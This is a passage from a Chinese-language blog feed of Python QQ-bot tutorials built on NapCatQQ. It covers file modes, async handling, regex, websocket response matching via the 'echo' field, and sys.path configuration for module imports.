<tr>
<td align="left">DeprecationWarning</td>
<td align="left">关于被弃用的特征的警告</td>
</tr>
<tr>
<td align="left">FutureWarning</td>
<td align="left">关于构造将来语义会有改变的警告</td>
</tr>
<tr>
<td align="left">OverflowWarning</td>
<td align="left">旧的关于自动提升为长整型(long)的警告</td>
</tr>
<tr>
<td align="left">PendingDeprecationWarning</td>
<td align="left">关于特性将会被废弃的警告</td>
</tr>
<tr>
<td align="left">RuntimeWarning</td>
<td align="left">可疑的运行时行为(runtime behavior)的警告</td>
</tr>
<tr>
<td align="left">SyntaxWarning</td>
<td align="left">可疑的语法的警告</td>
</tr>
<tr>
<td align="left">UserWarning</td>
<td align="left">用户代码生成的警告</td>
</tr>
</tbody></table>
<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>专有名词叫做 Python File(文件) 方法</p>
<h4 id="open-方法"><a href="#open-方法" class="headerlink" title="open() 方法"></a>open() 方法</h4><p>完整的语法格式为：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></div>

<p>参数说明:</p>
<ul>
<li>file: 必需，文件路径（相对或者绝对路径）。</li>
<li>mode: 可选，文件打开模式</li>
<li>buffering: 设置缓冲</li>
<li>encoding: 一般使用 utf8</li>
<li>errors: 报错级别</li>
<li>newline: 区分换行符</li>
<li>closefd: 传入的 file 参数类型</li>
<li>opener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。</li>
</ul>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">t</td>
<td align="left">文本模式 (默认)。</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">二进制模式。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">打开一个文件进行更新(可读可写)。</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">通用换行模式（不推荐）。</td>
</tr>
<tr>
<td align="left">r</td>
<td align="left">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td align="left">rb</td>
<td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">r+</td>
<td align="left">打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td align="left">rb+</td>
<td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left"><strong>w</strong></td>
<td align="left"><strong>打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</strong></td>
</tr>
<tr>
<td align="left">wb</td>
<td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">w+</td>
<td align="left">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="left">wb+</td>
<td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td align="left">ab</td>
<td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td align="left">a+</td>
<td align="left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td align="left">ab+</td>
<td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody></table>
<h4 id="file-对象"><a href="#file-对象" class="headerlink" title="file 对象"></a>file 对象</h4><p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法及描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-close.html" >file.close()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 关闭文件。关闭后文件不能再进行读写操作。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-flush.html" >file.flush()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-fileno.html" >file.fileno()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如 os 模块的 read 方法等一些底层操作上。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-isatty.html" >file.isatty()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如果文件连接到一个终端设备返回 True，否则返回 False。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-next.html" >file.next()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 返回文件下一行。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">[file.read(<a class="link"   href="https://www.runoob.com/python/python-file-read.html" >size])<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 从文件读取指定的字节数，如果未给定或为负则读取所有。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">[file.readline(<a class="link"   href="https://www.runoob.com/python/file-readline.html" >size])<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 读取整行，包括 “\n” 字符。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">[file.readlines(<a class="link"   href="https://www.runoob.com/python/file-readlines.html" >sizeint])<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 读取所有行并返回列表，若给定 sizeint &gt; 0，则是设置一次读多少字节，这是为了减轻读取压力。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">[file.seek(offset<a class="link"   href="https://www.runoob.com/python/file-seek.html" >, whence])<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 设置文件当前位置</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-tell.html" >file.tell()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 返回文件当前位置。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left">[file.truncate(<a class="link"   href="https://www.runoob.com/python/file-truncate.html" >size])<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 截取文件，截取的字节通过 size 指定，默认为当前文件位置。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/python-file-write.html" >file.write(str)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 将字符串写入文件，返回的是写入的字符长度。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><a class="link"   href="https://www.runoob.com/python/file-writelines.html" >file.writelines(sequence)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>
</tr>
</tbody></table>
<h3 id="函数处理"><a href="#函数处理" class="headerlink" title="函数处理"></a>函数处理</h3><h4 id="函数阻断"><a href="#函数阻断" class="headerlink" title="函数阻断"></a>函数阻断</h4><p>在执行过程中，不免要进行一些函数阻断，以防满足两个条件，导致运行两次。</p>
<p>在要执行的函数下面写个 <code>return</code>，就可以阻断函数继续执行。</p>
<h4 id="函数异步"><a href="#函数异步" class="headerlink" title="函数异步"></a>函数异步</h4><blockquote>
<p>我曾经想用 create_task 实现并发处理，不然的话同一时刻只能处理一条命令，如果出现 API 请求等耗时较长的，会占用时间导致其他命令无法被执行。</p>
<p>但是失败了，使用 create_task 之后会出现多个接收端，导致接收报错。</p>
<p>最终得出的结论是，<strong>没必要使用</strong>，本地处理几乎都是毫秒级的，就算是 API 请求，网络畅通的情况下也很快（大模型等需要思考的 API 请求除外）</p>
</blockquote>
<p>函数异步可以用 <code>async</code> 和 <code>await</code> 来实现，<code>async</code> 用于定义一个异步函数，<code>await</code> 用于等待一个异步函数执行完成。</p>
<p>当然如果你想让函数并发，那么可以使用 <code>asyncio</code> 模块来实现，<code>asyncio</code> 模块提供了一些函数来实现异步编程。</p>
<p>下面是一个具体例子</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">Example_main</span>(<span class="params">websocket, msg</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保数据目录存在</span></span><br><span class="line">    os.makedirs(DATA_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 并发执行任务</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(</span><br><span class="line">        handle_Example_group_message(websocket, msg),</span><br><span class="line">        handle_Example_group_notice(websocket, msg),</span><br><span class="line">        handle_Example_private_message(websocket, msg),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>

<h3 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h3><h4 id="规范数据类型"><a href="#规范数据类型" class="headerlink" title="规范数据类型"></a>规范数据类型</h4><p>例如在获取群号的时候，通常涉及到数据存储，为了方便做处理，一般以 str 类型保存群号，因为 msg 参数给出的是 int 类型，需要注意转换一下</p>
<p>2024 年 8 月 21 日，补充一句，不要一般了，获取到群号或 QQ 号一定要先转换成字符串，要不然后患无穷（不然就像我一样，JSON 字典存储数据，因为一个 str 和 int 数据类型不一致导致的 bug，找了三个小时才找到）</p>
<h3 id="数据的存储和交互"><a href="#数据的存储和交互" class="headerlink" title="数据的存储和交互"></a>数据的存储和交互</h3><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>在机器人的开发过程中，不可避免的会遇到数据存储的问题，通常会使用 json 文件进行存储，在 Python 中，可以使用 <code>json</code> 模块来处理 JSON 数据。</p>
<p>并且不免要进行数据的交互，比如从数据库中获取数据，或者将数据存储到本地，或者从本地获取数据，我习惯使用 <code>json</code> 文件进行存储，因为比较简单，并且容易理解。如果你知道如何使用数据库，那么你可以使用数据库进行存储，这样会更加安全可靠。</p>
<p>在数据交互的开发过程中，通常会先读取本地文件，然后进行数据处理，最后将数据存储到本地文件中，如此反复。</p>
<p>可能这个过程看起来比较繁琐耗时间，但实际上这个过程的处理几乎是毫秒级的，所以不用担心时间问题。</p>
<h4 id="数据库（SQLite）"><a href="#数据库（SQLite）" class="headerlink" title="数据库（SQLite）"></a>数据库（SQLite）</h4><p>JSON 只适合一些数据量小，而且简单，读写频率低的数据存储，如果数据量比较大，或者需要进行复杂的数据处理，那么可以使用数据库进行存储。</p>
<p>并且 JSON 在读写的时候容易出现数据丢失，所以不建议使用 JSON 进行大量的数据存储。</p>
<h4 id="数据的匹配（正则表达式）"><a href="#数据的匹配（正则表达式）" class="headerlink" title="数据的匹配（正则表达式）"></a>数据的匹配（正则表达式）</h4><p>在机器人的开发过程中，不免会遇到数据的匹配问题，比如检测是否是某个群，或者检测是否是某个 QQ 号，或者检测是否是某个关键词等。</p>
<p>可以使用正则表达式来实现数据的匹配，正则表达式是一种强大的文本处理工具，可以用来匹配、查找、替换和分割文本。</p>
<p>正则表达式相关知识点，可以看 <a class="link"   href="https://www.runoob.com/python/python-reg-expressions.html" >Python 正则表达式教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>这个正则表达式示例可以一看</p>
<h5 id="正则表达式实例"><a href="#正则表达式实例" class="headerlink" title="正则表达式实例"></a>正则表达式实例</h5><h6 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配"></a>字符匹配</h6><table>
<thead>
<tr>
<th align="left">实例</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">python</td>
<td align="left">匹配 “python”.</td>
</tr>
</tbody></table>
<h6 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h6><table>
<thead>
<tr>
<th align="left">实例</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[Pp] ython</td>
<td align="left">匹配 “Python” 或 “python”</td>
</tr>
<tr>
<td align="left">rub [ye]</td>
<td align="left">匹配 “ruby” 或 “rube”</td>
</tr>
<tr>
<td align="left">[aeiou]</td>
<td align="left">匹配中括号内的任意一个字母</td>
</tr>
<tr>
<td align="left">[0-9]</td>
<td align="left">匹配任何数字。类似于 [0123456789]</td>
</tr>
<tr>
<td align="left">[a-z]</td>
<td align="left">匹配任何小写字母</td>
</tr>
<tr>
<td align="left">[A-Z]</td>
<td align="left">匹配任何大写字母</td>
</tr>
<tr>
<td align="left">[a-zA-Z0-9]</td>
<td align="left">匹配任何字母及数字</td>
</tr>
<tr>
<td align="left">[^aeiou]</td>
<td align="left">除了 aeiou 字母以外的所有字符</td>
</tr>
<tr>
<td align="left">[^0-9]</td>
<td align="left">匹配除了数字外的字符</td>
</tr>
</tbody></table>
<h6 id="特殊字符类"><a href="#特殊字符类" class="headerlink" title="特殊字符类"></a>特殊字符类</h6><table>
<thead>
<tr>
<th align="left">实例</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.</td>
<td align="left">匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">匹配一个数字字符。等价于 [0-9]。</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">匹配一个非数字字符。等价于 [^0-9]。</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="left">\w</td>
<td align="left">匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。</td>
</tr>
</tbody></table>
<h3 id="常用函数或库"><a href="#常用函数或库" class="headerlink" title="常用函数或库"></a>常用函数或库</h3><h4 id="日期的处理"><a href="#日期的处理" class="headerlink" title="日期的处理"></a>日期的处理</h4><p>在 Python 中，可以使用 <code>datetime</code> 模块来处理日期，<code>datetime</code> 模块提供了一些函数来处理日期。用 <code>datetime.now()</code> 获取当前时间，用 <code>datetime.now().strftime(&#39;%Y-%m-%d %H:%M:%S&#39;)</code> 获取当前时间的字符串格式。</p>
<p>此方法可以用在检测日期或时间是否满足某个条件，比如检测是否是某个时间点，或者检测是否是某个时间段。实现 <strong>定时任务等功能</strong></p>
<p><a class="link"   href="https://blog.csdn.net/cmzsteven/article/details/64906245#" >Python 日期和时间教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>更方便的定时任务可以使用 <code>schedule</code> 模块，<code>schedule</code> 模块提供了一些函数来处理定时任务。</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——对websocket响应消息的分离处理</title>
    <url>/posts/8b45af9c.html</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small warning">
    <p>本文已过时，请参考最新文章：<a href="/posts/1ef8783.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25</a><br>本文已过时，请参考最新文章：<a href="/posts/1ef8783.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25</a><br>本文已过时，请参考最新文章：<a href="/posts/1ef8783.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25</a><br>本文已过时，请参考最新文章：<a href="/posts/1ef8783.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25</a><br>本文已过时，请参考最新文章：<a href="/posts/1ef8783.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25</a><br>本文已过时，请参考最新文章：<a href="/posts/1ef8783.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25</a></p>

  </div>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直以来 websocket 相应消息的接收都是有问题，之前想过很多办法，包括设置 sleep 等待，设置标志等的来分离 recv 来处理正确的响应，但是始终都没成功，这次改变了一下思路成功了</p>
<h2 id="修改前"><a href="#修改前" class="headerlink" title="修改前"></a>修改前</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">发送群消息并获取消息 ID</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_group_msg_with_reply</span>(<span class="params">websocket, group_id, content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        message = &#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;send_group_msg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;group_id&quot;</span>: group_id, <span class="string">&quot;message&quot;</span>: content&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(message))</span><br><span class="line">        response = json.loads(<span class="keyword">await</span> websocket.recv())</span><br><span class="line">        message_id = response.get(<span class="string">&quot;data&quot;</span>, &#123;&#125;).get(<span class="string">&quot;message_id&quot;</span>)</span><br><span class="line">        logging.info(</span><br><span class="line">            <span class="string">f&quot;[API]已发送群消息: <span class="subst">&#123;content&#125;</span> 到群 <span class="subst">&#123;group_id&#125;</span>，消息ID: <span class="subst">&#123;message_id&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> message_id</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;[API]发送群消息（带回复）失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure></div>

<p>例如这个发送群消息并获取消息 ID 的函数，一开始消息处理的速度很快，几乎是毫秒级回应，所以一直没怎么处理，也不影响正常运行</p>
<p>今天在扩展违禁词监控的时候，新增了一个触发违禁词之后检查之后的聊天记录，如果发现有违规者发送了视频，就直接撤回。</p>
<h2 id="修改后"><a href="#修改后" class="headerlink" title="修改后"></a>修改后</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">发送群消息并获取消息 ID</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_group_msg_with_reply</span>(<span class="params">websocket, group_id, content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        message = &#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;send_group_msg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;group_id&quot;</span>: group_id, <span class="string">&quot;message&quot;</span>: content&#125;,</span><br><span class="line">            <span class="string">&quot;echo&quot;</span>: <span class="string">&quot;send_group_msg_with_reply&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(message))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            response_data = json.loads(response)</span><br><span class="line">            <span class="keyword">if</span> response_data.get(<span class="string">&quot;echo&quot;</span>) == <span class="string">&quot;send_group_msg_with_reply&quot;</span>:</span><br><span class="line">                message_id = response_data.get(<span class="string">&quot;data&quot;</span>, &#123;&#125;).get(<span class="string">&quot;message_id&quot;</span>)</span><br><span class="line">                logging.info(<span class="string">f&quot;[API]已发送群消息到群 <span class="subst">&#123;group_id&#125;</span>，消息ID: <span class="subst">&#123;message_id&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> message_id</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;[API]发送群消息（带回复）失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure></div>

<p>修改后的函数添加了循环遍历，并使用 ob11 提供的 echo 字段来做标记。</p>
<p>这样就可以循环遍历，通过遍历收到的消息中符合 echo 对应的消息，就可以摘出想要的回应消息，以便于信息的处理</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——对websocket响应消息的回应处理2025.1.25</title>
    <url>/posts/1ef8783.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在之前 <a href="https://blog.w1ndys.top/posts/8b45af9c.html">基于 NapCatQQ 和 Python 的 QQ 机器人开发——对 websocket 响应消息的分离处理 | W1ndys 小屋</a> 的教程中提到对于 websocket 的回复捕获作处理获取返回值，后来随着开发和使用，出现了多线程的需求，而开启多线程之后会导致 websocket 返回的时候无法判断传给哪个线程，就会报错。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>在示例模块中 <a class="link"   href="https://github.com/W1ndysBot/Example" >W1ndysBot&#x2F;Example: W1ndysBot 的功能模块编写示例文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>已经做了处理，引入了新的回应事件处理函数，例如 <a class="link"   href="https://github.com/W1ndysBot/W1ndysBot/blob/main/app/handler_events.py#L271C1-L277C1" >W1ndysBot&#x2F;app&#x2F;handler_events.py at main · W1ndysBot&#x2F;W1ndysBot<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回应事件处理函数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_Example_response_message</span>(<span class="params">websocket, message</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg = json.loads(message)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> msg.get(<span class="string">&quot;status&quot;</span>) == <span class="string">&quot;ok&quot;</span>:</span><br><span class="line">            echo = msg.get(<span class="string">&quot;echo&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> echo <span class="keyword">and</span> echo.startswith(<span class="string">&quot;xxx&quot;</span>):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;处理Example回应事件时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>该函数会被消息处理模块调用，再加一些 if 条件判断，从而只会处理返回的 JSON 消息，可以通过设置一些全局变量来暂存数据，实现延迟撤回等操作，例如 <a class="link"   href="https://github.com/W1ndysBot/QFNUClassRegistrationCheck/blob/main/main.py#L458" >QFNUClassRegistrationCheck&#x2F;main.py at main · W1ndysBot&#x2F;QFNUClassRegistrationCheck<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 中，就通过暂存变量实现了延迟撤（可能未开源）</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——模块引用中环境变量的学习</title>
    <url>/posts/55d6cfbc.html</url>
    <content><![CDATA[<p>先看一个例子</p>
<p>假设文件结构如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">project/</span><br><span class="line">│</span><br><span class="line">├── app/</span><br><span class="line">│   ├── scripts/</span><br><span class="line">│   │   ├── GroupManager/</span><br><span class="line">│   │   │   ├── main.py</span><br><span class="line">│   │   │   ├── banned_words.py</span><br><span class="line">│   │   │   ├── group_status.py</span><br><span class="line">│   │   │   ├── invite_chain.py</span><br><span class="line">│   │   │   ├── welcome_farewell.py</span><br><span class="line">│   │   │   ├── group_management.py</span><br><span class="line">│   ├── api/</span><br><span class="line">│   ├── config.py</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>代码如下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/scripts/GroupManager/main.py</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(</span><br><span class="line">    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> app.scripts.GroupManager.banned_words <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> app.scripts.GroupManager.group_status <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> app.scripts.GroupManager.invite_chain <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> app.scripts.GroupManager.welcome_farewell <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> app.scripts.GroupManager.group_management <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> app.api <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> app.config <span class="keyword">import</span> owner_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), <span class="string">&quot;data&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>解释一下下面这段代码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">sys.path.append(</span><br><span class="line">    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>这段代码的作用是将一个目录路径添加到 Python 的模块搜索路径中。具体来说，它通过多次调用<code>os.path.dirname</code>函数，逐级向上查找目录，最终找到项目的根目录，并将其添加到<code>sys.path</code>中。这样，Python 在导入模块时，就可以从这个根目录开始搜索，从而找到项目中的模块。</p>
<p>在这里是首先获取当前文件的绝对路径，然后获取其上级目录，再获取上级目录，最后获取上级目录，然后将这个目录添加到 Python 的模块搜索路径中。获取了三层路径，最后把路径<code>project/app</code>添加到 sys.path 中。如此就可以通过绝对路径导入模块。例如<code>from app.scripts.GroupManager.banned_words import *</code></p>
<p>下面再解释一下下面的代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), &quot;data&quot;)</span><br></pre></td></tr></table></figure></div>

<p>这里是获取当前文件的绝对路径，然后获取其上级目录，然后将<code>data</code>目录添加到这个路径中，然后赋值给<code>DATA_DIR</code>。</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
